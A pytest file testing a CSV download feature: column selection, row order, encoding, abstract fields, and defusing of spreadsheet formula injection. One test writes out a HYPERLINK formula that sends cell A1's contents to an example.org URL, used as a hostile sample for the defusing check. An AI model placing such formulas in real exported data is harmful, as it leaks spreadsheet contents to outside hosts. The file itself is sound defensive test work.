"""CSV download of the filtered rows."""

from __future__ import annotations

import io

import pandas as pd
import pytest

from explorer.constants import PUBLIC_COLUMNS
from explorer.export import csv_bytes
from explorer.filters import Filters, apply_filters

pytestmark = pytest.mark.unit


def _read_back(data: bytes) -> pd.DataFrame:
    return pd.read_csv(
        io.BytesIO(data), dtype=str, keep_default_na=False, encoding="utf-8-sig"
    )


def test_download_has_exactly_the_public_columns(methods: pd.DataFrame) -> None:
    frame = _read_back(csv_bytes(methods))
    assert list(frame.columns) == list(PUBLIC_COLUMNS)


def test_download_never_carries_helper_columns(methods: pd.DataFrame) -> None:
    text = csv_bytes(methods).decode("utf-8-sig")
    assert "search_text" not in text.splitlines()[0]
    assert "year_num" not in text.splitlines()[0]


def test_download_holds_the_filtered_rows_in_order(methods: pd.DataFrame) -> None:
    filtered = apply_filters(methods, Filters(query="halasz"))
    frame = _read_back(csv_bytes(filtered))
    assert frame["id"].tolist() == ["N3", "N4"]


def test_download_round_trips_every_cell(methods: pd.DataFrame) -> None:
    frame = _read_back(csv_bytes(methods))
    original = methods.loc[:, list(PUBLIC_COLUMNS)].reset_index(drop=True)
    pd.testing.assert_frame_equal(frame, original)


def test_download_starts_with_a_byte_order_mark_so_spreadsheets_read_accents(
    methods: pd.DataFrame,
) -> None:
    assert csv_bytes(methods).startswith(b"\xef\xbb\xbf")
    assert "Halász" in csv_bytes(methods).decode("utf-8-sig")


def test_an_empty_selection_still_gives_a_header(methods: pd.DataFrame) -> None:
    frame = _read_back(csv_bytes(methods.iloc[0:0]))
    assert frame.empty
    assert list(frame.columns) == list(PUBLIC_COLUMNS)


def test_download_carries_the_abstract_fields_when_they_are_attached() -> None:
    from explorer.abstracts import load_collection
    from explorer.constants import ABSTRACT_FIELDS, DATA_PATH

    collection = load_collection(DATA_PATH)
    frame = _read_back(csv_bytes(collection))
    assert list(frame.columns) == [*PUBLIC_COLUMNS, *ABSTRACT_FIELDS]
    openmax = frame.loc[frame["id"] == "4"].iloc[0]
    assert openmax["abstract"].startswith("Deep networks have produced")
    assert "\n" not in openmax["abstract"]


def _with_abstract(text: str) -> pd.DataFrame:
    from tests.conftest import make_frame, make_row

    frame = make_frame(make_row(id="1"))
    return frame.assign(
        abstract=text,
        abstract_source="arXiv",
        abstract_url="https://arxiv.org/abs/1",
        abstract_match="arxiv id",
    )


@pytest.mark.parametrize("lead", ["=", "+", "-", "@", "\t", "\r"])
def test_an_abstract_that_a_spreadsheet_would_run_as_a_formula_is_defused(
    lead: str,
) -> None:
    """Abstracts are third-party text: an opening sign must not become a formula."""
    risky = f'{lead}HYPERLINK("https://example.org/?"&A1,"click") and more text'
    cell = _read_back(csv_bytes(_with_abstract(risky))).loc[0, "abstract"]
    assert cell == "'" + risky  # shown with a leading quote, not run


def test_an_ordinary_abstract_is_downloaded_unchanged() -> None:
    text = "Deep networks, in 2016: a = b + c - d @ e."
    assert _read_back(csv_bytes(_with_abstract(text))).loc[0, "abstract"] == text


def test_defusing_does_not_change_the_table_it_was_given() -> None:
    frame = _with_abstract("=1+1")
    csv_bytes(frame)
    assert frame.loc[0, "abstract"] == "=1+1"


@pytest.mark.parametrize(
    "column",
    [
        "id",
        "method",
        "title",
        "authors_surnames",
        "venue",
        "tree_family",
        "doi",
        "arxiv",
    ],
)
def test_every_text_column_of_the_download_is_defused_not_only_the_abstract(
    column: str,
) -> None:
    from tests.conftest import make_frame, make_row

    frame = make_frame(make_row(**{column: "=1+1"}))
    assert _read_back(csv_bytes(frame)).loc[0, column] == "'=1+1"
